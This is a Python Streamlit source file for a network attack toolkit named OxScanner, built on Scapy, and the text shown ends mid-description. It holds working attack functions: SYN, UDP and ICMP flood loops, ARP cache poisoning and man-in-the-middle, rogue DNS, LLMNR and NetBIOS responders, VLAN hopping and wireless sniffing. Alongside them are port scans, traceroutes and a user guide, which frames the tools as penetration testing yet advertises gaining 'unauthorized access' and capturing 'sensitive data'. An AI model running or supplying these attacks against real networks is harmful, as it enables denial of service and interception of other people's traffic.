import streamlit as st
from scapy.all import *
import os
import re
import random
import threading
from tabulate import tabulate
import socket
import time


# Port details with names, protocols, and descriptions
port_details = {
    21: {
        "name": "FTP 🌐",
        "protocol": "File Transfer Protocol 📂",
        "description": "FTP is used for transferring files between hosts. 🔄",
    },
    22: {
        "name": "SSH 🔒",
        "protocol": "Secure Shell 🔐",
        "description": "SSH is used for secure remote administration. 🖥️",
    },
    23: {
        "name": "Telnet 💻",
        "protocol": "Telnet Protocol 🌐",
        "description": "Telnet is used for remote command-line access. 🛠️",
    },
    25: {
        "name": "SMTP 📧",
        "protocol": "Simple Mail Transfer Protocol ✉️",
        "description": "SMTP is used for sending emails. 📬",
    },
    53: {
        "name": "DNS 📡",
        "protocol": "Domain Name System 🌐",
        "description": "DNS resolves domain names to IP addresses. 📍",
    },
    80: {
        "name": "HTTP 🌍",
        "protocol": "Hypertext Transfer Protocol 📄",
        "description": "HTTP is used for web traffic. 🚦",
    },
    443: {
        "name": "HTTPS 🔒",
        "protocol": "HTTP Secure 🔐",
        "description": "HTTPS is used for secure web traffic. 🚀",
    },
    # Add more ports as needed
}


# Streamlit page configuration
st.set_page_config(
    page_title="OxScanner",
    page_icon="🛡️",
    layout="wide"
)

# Load custom CSS
def load_css(file_name):
    with open(file_name) as f:
        st.markdown(f'<style>{f.read()}</style>', unsafe_allow_html=True)

    # Load the CSS file
load_css("ui/Style.css")

# Initialize a global variable to control the attack threads
attack_running = False
stop_event = threading.Event()

def start_syn_flood(target_ip):
    global attack_running
    attack_running = True
    while attack_running:
        send(IP(dst=target_ip)/TCP(sport=12345, dport=80, flags="S"), verbose=1)

def start_udp_flood(target_ip):
    global attack_running
    attack_running = True
    while attack_running:
        send(IP(dst=target_ip)/UDP(sport=12345, dport=53), verbose=1)

def start_icmp_flood(target_ip):
    global attack_running
    attack_running = True
    while attack_running:
        send(IP(dst=target_ip)/ICMP(), verbose=1)

def stop_attacks():
    global attack_running
    attack_running = False
    st.success("Attack stopped. 🛑")

# Function to execute ARP MitM attack
def arp_mitm(target1, target2):
    try:
        # Enable IP forwarding
        os.system("sysctl -w net.ipv4.ip_forward=1")
        
        # Send ARP packets to poison the ARP cache of both targets
        send(ARP(op=2, psrc=target2, hwsrc=get_if_hwaddr(conf.iface), pdst=target1), loop=1)
        send(ARP(op=2, psrc=target1, hwsrc=get_if_hwaddr(conf.iface), pdst=target2), loop=1)
        return True
    except Exception as e:
        st.error(f"Error during ARP MitM attack: {str(e)}")
        return False
    
# ARP Poisoning Function
def arp_poisoning(client_mac, gateway_ip, target_ip):
    try:
        # Sending ARP request to poison the target's ARP cache
        send(Ether(dst=client_mac) / ARP(op="who-has", psrc=gateway_ip, pdst=target_ip),
            inter=RandNum(10, 40), loop=1)
        return True
    except Exception as e:
        st.error(f"Error during ARP poisoning: {str(e)}")
        return False

# Function to scan specified ports
def tcp_port_scan(target, port_list):
    open_ports = {}
    for port in port_list:
        # Send a SYN packet to the specified port
        try:
            ans, _ = sr(IP(dst=target)/TCP(flags="S", dport=port), timeout=1, verbose=0)
            # Check for SYN-ACK response
            if ans and ans[0][1].haslayer(TCP) and ans[0][1][TCP].flags & 0x12:  # SYN-ACK flag
                port_name = port_details.get(port, {}).get("name", "Unknown Port")
                open_ports[port] = port_name
        except Exception as e:
            st.error(f"Error scanning port {port}: {e}")

    return open_ports

# Function to perform IKE scanning
def ike_scanning(target_range):
    try:
        # Send an IKE (Internet Key Exchange) request
        res, unans = sr(IP(dst=target_range)/UDP(sport=500, dport=500)/
                        ISAKMP(init_cookie=RandString(8), exch_type=2)/
                        ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()), timeout=2, verbose=False)

        if res:
            # Display summary of responses
            st.write("IKE Scan Results:")
            for snd, rcv in res:
                st.write(f"Response from: {rcv.src} | IKE Version: {rcv[ISAKMP].exch_type}")
        else:
            st.info("No responses received.")

    except Exception as e:
        st.error(f"Error during IKE scanning: {str(e)}")

# DNS Server Setup
def setup_dns_server(interface, match=None, joker="192.168.1.1", relay=False):
    try:
        dnsd(iface=interface, match=match or {}, joker=joker, relay=relay)
    except Exception as e:
        st.error(f"Error setting up DNS server: {str(e)}")

# mDNS Server Setup
def setup_mdns_server(interface, joker="192.168.1.1"):
    try:
        mdnsd(iface=interface, joker=joker)
    except Exception as e:
        st.error(f"Error setting up mDNS server: {str(e)}")

# LLMNR Server Setup
def setup_llmnr_server(interface, from_ip="10.0.0.1"):
    try:
        llmnrd(iface=interface, from_ip=Net(from_ip))
    except Exception as e:
        st.error(f"Error setting up LLMNR server: {str(e)}")

# Netbios Server Setup
def setup_netbios_server(interface, local_ip=None):
    try:
        nbnsd(iface=interface, ip=local_ip)
    except Exception as e:
        st.error(f"Error setting up Netbios server: {str(e)}")

# DNS Querry 
def dns_request(qname, qtype):
    ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype)))
    return ans

# Display DNS Request
def display_dns_results(ans):
    if ans and ans.haslayer(DNSRR):
        results = {}
        for rr in ans[DNS].an:
            if rr.type == 1:  # A
                results[rr.rrname.decode()] = rr.rdata
            elif rr.type == 28:  # AAAA
                results[rr.rrname.decode()] = rr.rdata
            elif rr.type == 15:  # MX
                results[rr.rrname.decode()] = rr.exchange.decode()  # MX record uses exchange field
            elif rr.type == 16:  # TXT
                # Join the list of strings for TXT records
                results[rr.rrname.decode()] = ' '.join([string.decode() for string in rr.rdata])
            elif rr.type == 2:  # NS
                results[rr.rrname.decode()] = rr.rdata.decode()  # NS records also use rdata
            elif rr.type == 5:  # CNAME
                results[rr.rrname.decode()] = rr.rdata.decode()  # CNAME uses rdata
            elif rr.type == 12:  # PTR
                results[rr.rrname.decode()] = rr.rdata.decode()  # PTR uses rdata
            elif rr.type == 6:  # SOA
                results[rr.rrname.decode()] = {
                    'mname': rr.mname.decode(),
                    'rname': rr.rname.decode(),
                    'serial': rr.serial,
                    'refresh': rr.refresh,
                    'retry': rr.retry,
                    'expire': rr.expire,
                    'minimum': rr.minimum
                }
            # Add more types as necessary
        return results
    return {"No response received.": ""}

# TCP SYN Traceroute
def tcp_syn_traceroute(target_ip, max_ttl=20):
    conf.verb = 1  # Disable Scapy's verbose output
    results = []

    for ttl in range(1, max_ttl + 1):
        # Send a TCP SYN packet with the current TTL value
        packet = IP(dst=target_ip, ttl=ttl) / TCP(dport=53, flags="S")  # Use port 80 or a known service
        ans, unans = sr(packet, timeout=2, verbose=0)

        if ans:
            for sent, received in ans:
                hop_info = {
                    "ttl": ttl,
                    "src_ip": received[IP].src if received.haslayer(IP) else "N/A",
                    "reply_ip": received[IP].dst if received.haslayer(IP) else "N/A",
                    "icmp_type": "N/A",
                    "tcp_flags": "N/A"
                }

                if received.haslayer(ICMP):
                    hop_info["icmp_type"] = received[ICMP].type
                    # Determine if it's an ICMP Time Exceeded or Destination Unreachable
                    if hop_info["icmp_type"] in [11, 3]:
                        hop_info["reply_ip"] = received[IP].src  # Use source IP of the ICMP response
                    if hop_info["icmp_type"] == 3:  # Destination Unreachable
                        hop_info["tcp_flags"] = "N/A"  # No TCP flags in ICMP response

                if received.haslayer(TCP):
                    tcp_flags = received[TCP].flags
                    # Add TCP flags description
                    if tcp_flags == 0x12:  # SYN-ACK
                        hop_info["tcp_flags"] = "SYN-ACK"
                    elif tcp_flags == 0x14:  # RST
                        hop_info["tcp_flags"] = "RST"
                    elif tcp_flags == 0x10:  # SYN
                        hop_info["tcp_flags"] = "SYN"
                    else:
                        hop_info["tcp_flags"] = f"Flags: {tcp_flags}"

                results.append(hop_info)
        else:
            results.append({
                "ttl": ttl,
                "src_ip": "N/A",
                "reply_ip": "No response",
                "icmp_type": "N/A",
                "tcp_flags": "N/A"
            })

    return results

# UDP Traceroute
def udp_traceroute(target_ip):
    # Send UDP packets with increasing TTL
    res, unans = sr(IP(dst=target_ip, ttl=(1, 20)) / UDP(dport=33434) / DNS(qd=DNSQR(qname="test.com")), timeout=2, verbose=0)
    hop_info = []

    for snd, rcv in res:
        hop_details = {
            "hop": snd.ttl,
            "src_ip": snd.src,                   # Source IP of the sent packet
            "dst_ip": snd.dst,                   # Destination IP of the sent packet
            "reply_ip": rcv.src,                 # IP address of the reply
            "reply_type": rcv[ICMP].type if ICMP in rcv else "N/A",  # ICMP type if available
            "reply_code": rcv[ICMP].code if ICMP in rcv else "N/A",  # ICMP code if available
            "length": len(rcv),                  # Length of the response packet
            "ttl": rcv.ttl if ICMP in rcv else "N/A",  # TTL of the reply
            "protocol": rcv[IP].proto if IP in rcv else "N/A"  # Protocol used
        }
        hop_info.append(hop_details)

    # Collect any unanswered packets
    for snd in unans:
        hop_details = {
            "hop": snd.ttl,
            "src_ip": snd.src,
            "dst_ip": snd.dst,
            "reply_ip": "No response",
            "reply_type": "N/A",
            "reply_code": "N/A",
            "length": "N/A",
            "ttl": "N/A",
            "protocol": "N/A"
        }
        hop_info.append(hop_details)

    return hop_info

# DNS Traceroute
def dns_traceroute(target_ip, domain):

    # DNS Type Mapping
    DNS_TYPE_MAP = {
        1: "A",
        2: "NS",
        5: "CNAME",
        6: "SOA",
        12: "PTR",
        15: "MX",
        16: "TXT",
        28: "AAAA",
        33: "SRV",
        255: "ANY"
    }

    # Perform traceroute
    ans, unans = traceroute(target_ip, l4=UDP(sport=RandShort()) / DNS(qd=DNSQR(qname=domain)), verbose=0)
    
    # Prepare results for display
    results = []
    for s, r in ans:
        # Check if the response is a DNS response
        if r.haslayer(DNS):
            dns_layer = r[DNS]
            dns_type_code = dns_layer.qd.qtype  # DNS query type code
            dns_type_name = DNS_TYPE_MAP.get(dns_type_code, "Unknown")  # Get type name

            hop_info = {
                "hop": s.ttl,                           # Hop number based on TTL
                "src_ip": s.src,                       # Source IP of the sent packet
                "dst_ip": r.dst,                       # Destination IP of the response
                "reply_ip": r.src,                     # IP address of the reply
                "dns_type": f"{dns_type_code} ({dns_type_name})",  # DNS query type with name
                "response_code": dns_layer.rcode,      # DNS response code
                "length": len(r),                      # Length of the response packet
                "protocol": r[IP].proto if r.haslayer(IP) else "N/A"  # Protocol used
            }
        else:
            hop_info = {
                "hop": s.ttl,
                "src_ip": s.src,
                "dst_ip": r.dst,
                "reply_ip": "No response",
                "dns_type": "N/A",
                "response_code": "N/A",
                "length": "N/A",
                "protocol": "N/A"
            }

        results.append(hop_info)

    # Handle unanswered packets
    for s in unans:
        hop_info = {
            "hop": s.ttl,
            "src_ip": s.src,
            "dst_ip": s.dst,
            "reply_ip": "No response",
            "dns_type": "N/A",
            "response_code": "N/A",
            "length": "N/A",
            "protocol": "N/A"
        }
        results.append(hop_info)

    return results

# Ether Leaking 
def ether_leaking(target_ip):
    # Send an ICMP Echo Request
    ans = sr1(IP(dst=target_ip) / ICMP(), timeout=2, verbose=1)

    if ans is not None:
        ans.show()
        ip_layer = ans[IP]
        icmp_layer = ans[ICMP]

        # Formatting the packet information in a human-readable way
        output = f"""
IP Layer
Version  : {ip_layer.version}
IHL      : {ip_layer.ihl}
TOS      : {ip_layer.tos:#04x}
Length   : {ip_layer.len}
ID       : {ip_layer.id}
Flags    : {ip_layer.flags}
Fragment : {ip_layer.frag}
TTL      : {ip_layer.ttl}
Protocol : {ip_layer.proto}
Checksum : {ip_layer.chksum:#04x}
Source   : {ip_layer.src}
Destination: {ip_layer.dst}

ICMP Layer ###
Type     : {icmp_layer.type}
Code     : {icmp_layer.code}
Checksum : {icmp_layer.chksum:#04x}
ID       : {icmp_layer.id:#04x}
Sequence : {icmp_layer.seq:#04x}
"""
        return output
    else:
        return "No response received."

# ICMP Leaking
def icmp_leaking(target_ip):
    # Send ICMP request with custom options
    ans = sr1(IP(dst=target_ip, options="\x02") / ICMP(), timeout=2)

    if ans is not None:
        ans.show()
        ip_layer = ans[IP]
        icmp_layer = ans[ICMP]
        ip_in_icmp_layer = ans.getlayer(IP, 1)  # IP layer inside ICMP
        icmp_in_icmp_layer = ans.getlayer(ICMP, 1)  # ICMP layer inside ICMP

        # Convert flags to string to avoid formatting errors
        ip_flags = str(ip_layer.flags) if ip_layer.flags is not None else 'N/A'
        ip_in_icmp_flags = str(getattr(ip_in_icmp_layer, 'flags', 'N/A'))

        # Function to handle None values and ensure the return value is always a string
        def safe_format(value):
            return str(value) if value is not None else 'N/A'

        # Create a consistent column width for the output
        column_width = 30
        separator = "   |   "
        line = "-" * (column_width * 4 + len(separator) * 3)

        # Column titles and formatted output
        output = f"""
    {"ICMP Leaking Results:"}
    {"IP Layer".ljust(column_width)}{separator}{"ICMP Layer".ljust(column_width)}{separator}{"IP in ICMP Layer".ljust(column_width)}{separator}{"ICMP in ICMP Layer".ljust(column_width)}
    {line}
    {"Version       : " + safe_format(ip_layer.version).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(icmp_layer.type).ljust(column_width - 14)}{separator}{"Version       : " + safe_format(getattr(ip_in_icmp_layer, 'version', None)).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(getattr(icmp_in_icmp_layer, 'type', None)).ljust(column_width - 14)}
    {"IHL           : " + safe_format(ip_layer.ihl).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(icmp_layer.code).ljust(column_width - 14)}{separator}{"IHL           : " + safe_format(getattr(ip_in_icmp_layer, 'ihl', None)).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(getattr(icmp_in_icmp_layer, 'code', None)).ljust(column_width - 14)}
    {"TOS           : " + safe_format(format(ip_layer.tos, '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(icmp_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"TOS           : " + safe_format(format(getattr(ip_in_icmp_layer, 'tos', 0), '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(getattr(icmp_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}
    {"Length        : " + safe_format(ip_layer.len).ljust(column_width - 14)}{separator}{"Pointer       : " + safe_format(getattr(icmp_layer, 'ptr', None)).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(ip_in_icmp_layer, 'len', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(icmp_in_icmp_layer, 'id', None)).ljust(column_width - 14)}
    {"ID            : " + safe_format(ip_layer.id).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(icmp_layer, 'length', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(ip_in_icmp_layer, 'id', None)).ljust(column_width - 14)}{separator}{"Sequence      : " + safe_format(getattr(icmp_in_icmp_layer, 'seq', None)).ljust(column_width - 14)}
    {"Flags         : " + safe_format(ip_flags).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(ip_layer.proto).ljust(column_width - 14)}{separator}{"Flags         : " + safe_format(ip_in_icmp_flags).ljust(column_width - 14)}{separator}
    {"Fragment      : " + safe_format(ip_layer.frag).ljust(column_width - 14)}{separator}{"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Fragment      : " + safe_format(getattr(ip_in_icmp_layer, 'frag', None)).ljust(column_width - 14)}{separator}
    {"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(getattr(ip_in_icmp_layer, 'proto', None)).ljust(column_width - 14)}{separator}{"Source        : " + safe_format(ip_layer.src).ljust(column_width - 14)}{separator}
    {"Source        : " + safe_format(ip_layer.src).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(ip_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"Destination   : " + safe_format(ip_layer.dst).ljust(column_width - 14)}{separator}
    {"Destination   : " + safe_format(ip_layer.dst).ljust(column_width - 14)}{separator}"""
        
        return output
    else:
        return "No response received."

# VLAN Hopping
def vlan_hopping(target_ip):
    # Prepare the packet
    packet = Ether() / Dot1Q(vlan=2) / Dot1Q(vlan=7) / IP(dst=target_ip) / ICMP()
    
    # Send and receive packet
    ans, unans = srp(packet, timeout=2, verbose=0)
    
    # Return the results for further processing
    return ans

# Wireless Sniffing
def wireless_sniffing(iface):
    # Attempt to start sniffing
    try:
        sniff(iface=iface, prn=lambda x: x.sprintf("{Dot11Beacon:%Dot11.addr2% -> %Dot11.addr1%: %Dot11Beacon.cap%}"))
    except ValueError as e:
        st.error(f"Error starting sniffing: {str(e)}")


# Initialize session state for login
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

# Function to handle login
def login():
    st.session_state.logged_in = True

# Display Introduction Page
if not st.session_state.logged_in:
    st.header("🔧 OxSecure Tools")
    
    # Introduction
    st.subheader("Welcome to the OxScanner App! 🎉")
    st.write("Explore our powerful suite of tools for network analysis and security testing:")

    # Tools List with Better Spacing
    tools_list = """
    - **🔍 DNS Queries**: 
    Perform quick DNS lookups to translate domain names into IP addresses with ease. Just enter a domain, and let us handle the rest!

    - **⚔️ Classical Attacks**: 
    Engage in traditional attack simulations like Ping of Death and Land Attack. Select an attack type, set parameters, and watch as we demonstrate vulnerabilities in real-time!

    - **📡 ARP Cache Poisoning**: 
    Redirect traffic by poisoning the ARP cache of a target. Input the target IP, and we’ll send forged ARP responses to reroute network traffic.

    - **🕵️‍♂️ ARP MitM Attack**: 
    Conduct Man-in-the-Middle attacks to intercept communications seamlessly. Specify target IPs, and start capturing traffic effortlessly.

    - **🔍 TCP Port Scanning**: 
    Identify open services and potential vulnerabilities by scanning specific ports. Just enter the target IP and port range for instant results.

    - **🔐 IKE Scanning**: 
    Scan for Internet Key Exchange services and detect vulnerabilities in VPN configurations. Enter a target IP, and we’ll check for weaknesses in no time!

    - **📜 DNS Server Setup**: 
    Set up a custom DNS server to manage domain resolutions within your network. Configure records, and we’ll handle the rest!

    - **🌐 mDNS Server Setup**: 
    Create a multicast DNS server for automatic device discovery. Configure settings, and watch devices resolve names effortlessly.

    - **🔗 LLMNR Server Setup**: 
    Establish a Local Link Multicast Name Resolution server for small networks. Input details, and we’ll get it up and running!

    - **📡 Netbios Server Setup**: 
    Set up a NetBIOS server for legacy applications and services. Configure parameters, and enjoy seamless local network interactions.

    - **🔍 TCP SYN Traceroute**: 
    Trace the path packets take to reach their destination using SYN packets. Enter a target IP and uncover the journey!

    - **🌐 UDP Traceroute**: 
    Discover network paths using UDP packets. Specify the target IP for a thorough path analysis!

    - **📡 DNS Traceroute**: 
    Trace the route DNS queries take to resolve domain names. Just enter a domain, and we'll reveal the path taken.

    - **🛠 Etherleaking**: 
    Extract sensitive information by exploiting vulnerabilities in Ethernet protocols. Specify targets, and we’ll craft packets to unveil data.

    - **🧬 ICMP Leaking**: 
    Use ICMP to leak sensitive information from target systems. Define your targets, and we’ll craft requests to extract data.

    - **🔀 VLAN Hopping**: 
    Gain unauthorized access to VLAN traffic. Configure parameters, and we’ll send crafted packets to test VLAN security.

    - **📶 Wireless Sniffing**: 
    Monitor wireless network traffic to capture sensitive data. Select the network, and we’ll start capturing packets for analysis.
    """

    st.markdown(tools_list)

    # Spacing and button for login
    st.markdown("<br>", unsafe_allow_html=True)  # Add some space before the button
    if st.button("🔑 **Login**", on_click=login):
        st.success("Welcome! Please proceed to explore the tools.")


else:
    st.header("🛜 OxScanner")
    # Sidebar Section
    with st.sidebar:
        st.markdown("## Choose Tools 🧑‍💻")  # Sidebar title with emoji
        # Radio button for selecting sections
        section = st.radio("Select a Section:", 
            ["📃 Requirements",
            "🔍 DNS Queries", 
            "🔐 IKE Scanning", 
            "⚔️ Classical Attacks", 
            "📡 ARP Cache Poisoning", 
            "🕵️‍♂️ ARP MitM Attack", 
            "🔍 TCP Port Scanning", 
            "📜 DNS Server Setup", 
            "🌐 mDNS Server Setup", 
            "🔗 LLMNR Server Setup", 
            "📡 NTbios Server Setup", 
            "🔍 TCP SYN Traceroute", 
            "🌐 UDP Traceroute", 
            "📡 DNS Traceroute", 
            "🛠 Etherleaking", 
            "🧬 ICMP Leaking", 
            "🔀 VLAN Hopping", 
            "📶 Wireless Sniffing"], 
            index=0, format_func=lambda x: x, horizontal=True)
        
    #Requirements and Prerequisites Section
    if section == "📃 Requirements":
        # Requirements and Prerequisites Section
        st.markdown("""
        ##### 📜 Requirements and Prerequisites for OxScanner

        To effectively use the OxScanner, please ensure the following requirements and prerequisites are met:

        ##### 1. System Requirements 🖥️

        - **Operating System**: 
        - Linux (Ubuntu, Debian, or any other distribution) is recommended for network-related functionalities.
        - Windows can be used but may require additional configurations for certain tools.

        - **Python Version**: 
        - Python 3.7 or higher.

        ##### 2. Permissions 🔑

        - **Administrative/Sudo Access**: 
        - Certain functionalities, like sniffing packets or setting up network services, require elevated privileges. Run the application with `sudo` or ensure your user has the necessary permissions to access network interfaces.
        
        - **IP Forwarding**:
        - To execute ARP poisoning or man-in-the-middle (MitM) attacks, ensure IP forwarding is enabled. This can be done with the following command:
            ```bash
            sudo sysctl -w net.ipv4.ip_forward=1
            ```

        ##### 3. Frameworks and Libraries 📚

        - **Python Libraries**: 
        - Install the necessary libraries via pip. Use the following command to install all dependencies:
            ```bash
            pip install streamlit scapy
            ```

        - **Additional Dependencies**:
        - Some functionalities might require the installation of additional libraries or tools:
            - **Scapy**: For network packet manipulation and sniffing.
            - **dnsmasq**: Required for DNS and mDNS functionalities.
            - Install using:
            ```bash
            sudo apt install dnsmasq
            ```

        ##### 4. Tools Required 🔧

        - **Streamlit**: The main framework for building the web application.
        - **Scapy**: A powerful Python library used for packet manipulation and network scanning.
        - **dnsmasq**: Lightweight DNS forwarder and DHCP server.
        - **mdnsd**: Multicast DNS responder for mDNS functionalities.

        ##### 5. Network Interface Configuration 🌐

        - **Network Interfaces**:
        - Ensure that the correct network interfaces are available and properly configured for sniffing and other network operations. You can list available interfaces using the following command:
            ```bash
            ifconfig
            ```

        - **Monitor Mode for Wireless Testing**:
        - To perform wireless network testing (e.g., Wi-Fi sniffing, wireless hopping), make sure that your wireless interfaces are set to monitor mode.
        - Use the following commands to enable monitor mode for wireless interfaces (e.g., `wlan0`):
            ```bash
            sudo ifconfig wlan0 down
            sudo iwconfig wlan0 mode monitor
            sudo ifconfig wlan0 up
            ```

        - Once your interface is in monitor mode, you can scan wireless traffic and perform wireless-based attacks.

        ##### 6. Usage Instructions 🚀

        - Start the application using the following command:
        ```bash
        streamlit oxscanner.py
        ```
        
        Replace `your_app.py` with the actual filename of your Streamlit application.

        - Access the application through a web browser at `http://localhost:8501`.

        ##### 7. Additional Considerations ⚠️

        - **Firewall Settings**: Ensure that firewall settings allow for the necessary network traffic for the application to function properly.
        - **Network Configuration**: Depending on your network setup (especially in corporate environments), additional configuration might be required to allow for ARP, mDNS, and other network-related services to function.

        ##### Example Commands 💻

        To set up and run the application, follow these commands:

        ```bash
        # Install required packages
        sudo apt update
        sudo apt install dnsmasq
        pip install streamlit scapy

        # Enable IP forwarding
        sudo sysctl -w net.ipv4.ip_forward=1

        # Set wireless interface in monitor mode (for wlan0)
        sudo ifconfig wlan0 down
        sudo iwconfig wlan0 mode monitor
        sudo ifconfig wlan0 up

        # Run the Streamlit app
        sudo streamlit run your_app.py
        ```
        """)

    # DNS Queries Section
    elif section == "🔍 DNS Queries":
        st.header("🔍 DNS Queries")
        
        # Informative Description
        st.write("""
        **What are DNS Queries?**  
        DNS (Domain Name System) queries are essential in converting human-readable domain names (like `secdev.org`) into machine-readable IP addresses. This process enables browsers and other applications to locate and connect to web servers and services efficiently.

        **Workflow of a DNS Query:**  
        1. **User Input**: You enter a domain name and select the desired record type (e.g., A, AAAA, MX).
        2. **DNS Resolver**: The query is sent to a DNS resolver, which is responsible for initiating the query process.
        3. **Root DNS Server**: The resolver contacts a root DNS server to find the authoritative server for the domain.
        4. **TLD Server**: The resolver queries the TLD (Top-Level Domain) server (e.g., `.org` for `secdev.org`) to find the authoritative name server.
        5. **Authoritative DNS Server**: The resolver queries the authoritative DNS server for the requested record type, retrieving the corresponding IP address or other data.
        6. **Result Returned**: Finally, the resolver returns the result to your application, allowing it to connect to the desired resource.

        **Uses and Purpose:**  
        - **Website Access**: Facilitates the connection between users and websites by resolving domain names to IP addresses.
        - **Email Routing**: MX records help in directing emails to the correct mail servers.
        - **Service Discovery**: Enables applications to discover services associated with a domain through TXT or SRV records.
        - **Network Management**: Assists in managing domains and subdomains through various record types.

        **How It Works:**  
        - The DNS system operates on a hierarchical structure, with various types of records serving different purposes. For example:
            - **A Record**: Maps a domain to its IPv4 address.
            - **AAAA Record**: Maps a domain to its IPv6 address.
            - **MX Record**: Specifies mail exchange servers for handling email for the domain.
            - **TXT Record**: Allows domain administrators to add arbitrary text to the DNS records, often used for verification purposes.

        With this understanding, you're equipped to perform DNS queries effectively!
        """)

        # User Input for DNS Query
        qname = st.text_input("Domain Name", "secdev.org")
        
        # Expanded record types
        qtype = st.selectbox("Record Type", [
            "A", "AAAA", "MX", "TXT", "NS", "CNAME", "PTR", "SOA"
        ])
        
        if st.button("Perform DNS Query"):
            ans = dns_request(qname, qtype)
            results = display_dns_results(ans)
            st.write(f"Results for {qtype} record of **{qname}**:")
            
            # Displaying results in a clear format
            if results:
                for record, data in results.items():
                    if isinstance(data, dict):  # Handle complex SOA results
                        st.write(f"- **{record}:**")
                        for key, value in data.items():
                            st.write(f"  - {key}: {value}")
                    else:
                        st.write(f"- **{record}:** {data}")
            else:
                st.write("No results found.")


    # IKE Scanning Section
    elif section == "🔐 IKE Scanning":
        st.header("🔐 IKE Scanning")
        
        # Informative Description
        st.write("""
        **What is IKE Scanning?**  
        IKE (Internet Key Exchange) is a key management protocol used in IPsec VPNs to establish secure connections between two parties. IKE scanning involves probing the target IP for vulnerabilities related to the IKE protocol, which could potentially be exploited by attackers.

        **Workflow of IKE Scanning:**  
        1. **User Input**: You provide the target IP address that you want to scan for IKE vulnerabilities.
        2. **Initiating Scan**: The application sends crafted packets to the target to initiate the IKE negotiation process.
        3. **Response Analysis**: The application analyzes the responses from the target to determine its configuration and any potential vulnerabilities.
        4. **Reporting Results**: After the scan is complete, the results are presented, highlighting any weaknesses detected.

        **Uses and Purpose:**  
        - **Security Assessment**: Helps in assessing the security posture of VPN configurations by identifying weak IKE settings.
        - **Vulnerability Detection**: Finds common vulnerabilities in IKE implementations, such as weak encryption algorithms or misconfigurations.
        - **Network Security**: Essential for network administrators to ensure that their VPNs are securely configured and resistant to attacks.

        **How It Works:**  
        - The scan primarily checks for the following:
            - **Authentication Methods**: Verifies the types of authentication supported (e.g., PSK, certificates).
            - **Encryption Algorithms**: Determines the strength of the encryption algorithms used.
            - **Key Exchange Settings**: Checks for vulnerabilities in the key exchange process.
        - By analyzing these factors, you can identify potential weaknesses and take appropriate action to mitigate them.

        With IKE scanning, you can proactively secure your VPN infrastructure against potential threats!
        """)

        # User Input for IKE Scan
        ike_target = st.text_input("IKE Target IP", "192.168.1.5")
        
        # Validate IP address using regex
        def is_valid_ip(ip):
            return re.match(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", ip) is not None

        if st.button("Perform IKE Scan"):
            # Validate the target IP
            if not is_valid_ip(ike_target):
                st.error("Invalid IKE target IP address format.")
            else:
                ike_scanning(ike_target)
                st.success(f"IKE scanning on {ike_target} initiated. 🔐")


    # Classical Attacks Section
    elif section == "⚔️ Classical Attacks":
        st.header("⚔️ Classical Attacks")
        
        # Informative Description
        st.write("""
        ***What are Classical and Advanced Network Attacks? 🔐***

        In cybersecurity, both **classical** and **advanced network attacks** exploit vulnerabilities within systems to test the resilience of networks. These attacks are commonly used in penetration testing to evaluate network defenses and identify potential weaknesses. This tool allows you to simulate various types of attacks for educational, testing, and training purposes.

        ***Workflow of Network Attacks*** 🚧
        1. **Select Attack Type**: Choose from a variety of attack types in the dropdown menu.
        2. **Input Target IP**: Enter the IP address of the target machine or network you intend to test.
        3. **Execute Attack**: Click the button to initiate the selected attack and observe its behavior.

        ***Purpose of Network Attacks*** 🎯
        - **Security Testing**: These attacks help security professionals test a network's vulnerability to common threats.
        - **Awareness Training**: System administrators can learn about potential attack vectors and how to prevent them.
        - **Remediation**: Identifying weak points enables the implementation of appropriate countermeasures.

        ---

        ***Types of Attacks 🛡️***

        1. **Ping of Death ☠️**
        - **Description**: The Ping of Death attack involves sending oversized ICMP (ping) packets, which can crash or freeze the target system.
        - **How It Works**: By sending fragmented ICMP packets that exceed the maximum size, the target system may fail to reassemble them correctly, resulting in system instability or failure.
        - **Usage**: Primarily used to test a system's resilience against malformed packets.

        2. **Land Attack 🕷️**
        - **Description**: A Land Attack sends a TCP packet where the source and destination IP addresses are the same, confusing the target system and potentially causing it to crash.
        - **How It Works**: The system receives a packet that appears to originate from itself, which can result in a denial-of-service (DoS).
        - **Usage**: This attack tests how the target handles improper source and destination addressing.

        ---

        ***Advanced Attacks*** 💣

        3. **SYN Flood 🌊**
        - **Description**: A SYN Flood attack involves sending multiple SYN packets without completing the TCP handshake, causing the server to allocate resources and eventually leading to exhaustion.
        - **How It Works**: By continuously initiating half-open connections, the server's resources are consumed, potentially leading to denial-of-service (DoS).
        - **Usage**: This is a common attack for testing how well a server can handle large volumes of connection requests.

        4. **UDP Flood 🚀**
        - **Description**: A UDP Flood attack sends large volumes of UDP packets to random ports on a target, overwhelming its ability to process incoming requests.
        - **How It Works**: The target system tries to handle the incoming traffic but can be overwhelmed, resulting in service disruption.
        - **Usage**: This attack tests a network's ability to handle unsolicited UDP traffic.

        5. **ICMP Flood 🌩️**
        - **Description**: This attack involves sending a high volume of ICMP echo requests (pings) to the target, flooding it with network traffic.
